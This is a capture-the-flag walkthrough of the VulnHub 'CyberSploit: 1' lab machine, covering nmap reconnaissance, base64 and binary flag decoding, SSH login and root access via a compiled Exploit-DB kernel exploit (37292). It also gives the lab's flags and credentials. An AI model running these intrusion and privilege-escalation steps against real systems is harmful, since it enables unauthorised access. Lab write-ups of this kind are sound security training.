# CyberSploit: 1

![image](https://user-images.githubusercontent.com/44063862/88623221-1362a780-d0d7-11ea-8d8a-cd04dd008314.png)

## :link: Link 

[CyberSploit: 1](https://www.vulnhub.com/entry/cybersploit-1,506/)

## Penetration Testing Methodology

**Reconnaissance**
* Netdiscover
* Nmap

**Enumeration**
* dirbuster
* decode (base64)

**Exploitation**

**Privilege Escalation**
* gcc 37292.c

**Capturing the flag**
* Flag1
* Flag2
* Flag3

_______________________________________________________________________________________________________

## Walkthrough

```
netdiscover
```

![image](https://user-images.githubusercontent.com/44063862/88623292-39884780-d0d7-11ea-80d8-8b9e4cbe48dd.png)

```
nmap -A 192.168.235.154
```

```
root@kali:~# nmap -A 192.168.235.154
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 13:17 EDT
Nmap scan report for 192.168.235.154
Host is up (0.0011s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)
|   2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)
|_  256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hello Pentester!
MAC Address: 00:0C:29:E7:39:7C (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.09 ms 192.168.235.154

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.64 seconds
root@kali:~# 
```

From the nmap scanning. I found that 2 port open. Which is
* 22 (ssh) 
* 80 (http)

I then browse to the http://ip

![image](https://user-images.githubusercontent.com/44063862/88623427-8835e180-d0d7-11ea-811a-aecb8b360179.png)

View page source, will give us some more info

![image](https://user-images.githubusercontent.com/44063862/88623632-f67aa400-d0d7-11ea-84e9-cd674396d116.png)

**HINT:** username:itsskv

**YOU SHOULD TRY SOMETHING MORE** Okay, lets do directory fuzzing. I use dirbuster.

![image](https://user-images.githubusercontent.com/44063862/88623558-c8955f80-d0d7-11ea-9f55-fe6d1ac74189.png)

We got **robots.txt**

![image](https://user-images.githubusercontent.com/44063862/88623697-1ad68080-d0d8-11ea-8277-28f26e96bb81.png)

**R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9**

Let's [decode](https://www.tunnelsup.com/hash-analyzer/)

![image](https://user-images.githubusercontent.com/44063862/88623936-99332280-d0d8-11ea-93fc-44190abb6dfc.png)

This tools analyze this character is Base 64. 

Decode [Base 64](https://gchq.github.io/CyberChef/)

![image](https://user-images.githubusercontent.com/44063862/88624013-cbdd1b00-d0d8-11ea-9956-6a1e355ab652.png)

> **Flag1: cybersploit{youtube.com/c/cybersploit}**

Okay.. Im stucked now. 

![image](https://user-images.githubusercontent.com/44063862/88624115-00e96d80-d0d9-11ea-87d8-9394de6997e1.png)

What if...... we try to.. Hmm it's okay..

Hmm.. But, we can just try is it?

Hmm.. BUT it's seems impossible. hmmm...

Let's try login into ssh using first flag.. I don't know. It seem impossible, but we don't have anything for now.

```
ssh itsskv@192.168.235.154
```

At first I put Password (cybersploit) nahh.. Then, youtube. nahh.. then, youtube.com. So, I thought, I'm being ridiculous. BUT, you know what is the answer?? It is the flag. But, not half. ITS ALL!!!

Password: cybersploit{youtube.com/c/cybersploit}

![image](https://user-images.githubusercontent.com/44063862/88624512-b2889e80-d0d9-11ea-8ef3-3d08a9057a26.png)

```
ls -al
```

![image](https://user-images.githubusercontent.com/44063862/88624594-d8ae3e80-d0d9-11ea-921d-68f8dbfa820d.png)

```
cat flag2.txt
```

![image](https://user-images.githubusercontent.com/44063862/88624674-f9769400-d0d9-11ea-9ca4-0eb51e141f45.png)

Let's decode this obvious [Binary](https://gchq.github.io/CyberChef/)

![image](https://user-images.githubusercontent.com/44063862/88624796-2e82e680-d0da-11ea-856b-22903d875b51.png)

> **flag2: cybersploit{https:t.me/cybersploit1}**

> For Privilege Escalation

```
uname -a
cd /tmp
```

![image](https://user-images.githubusercontent.com/44063862/88624924-6be77400-d0da-11ea-88d7-df94a63e6ea0.png)

OH-HOO.. Let's find the vulnerability.. 

Find: [3.13.0-32-generic](https://www.exploit-db.com/exploits/37292)

Copy the code and make a file in ste system. 37292.c (Vulnerability Code file)

```
nano 37292.c
gcc 37292.c -o root
./root
```

![image](https://user-images.githubusercontent.com/44063862/88625164-d13b6500-d0da-11ea-9a34-4c3236fa5a4f.png)

```
id
ls -al
ls -al /root
```

![image](https://user-images.githubusercontent.com/44063862/88625222-e7492580-d0da-11ea-98b3-b9cf2603e058.png)

Hehehehehe. Did you see what I see??..

```
cat /root/finalflag.txt
```

![image](https://user-images.githubusercontent.com/44063862/88625337-22e3ef80-d0db-11ea-8eb1-fa1bc6c13fe2.png)

> **flag3: cybersploit{Z3X21CW42C4 many many congratulations !}**

Okay, Thats all for Cybersploit machine. Thank you for reading. :white_flower:

**By _AdaniKamal_**
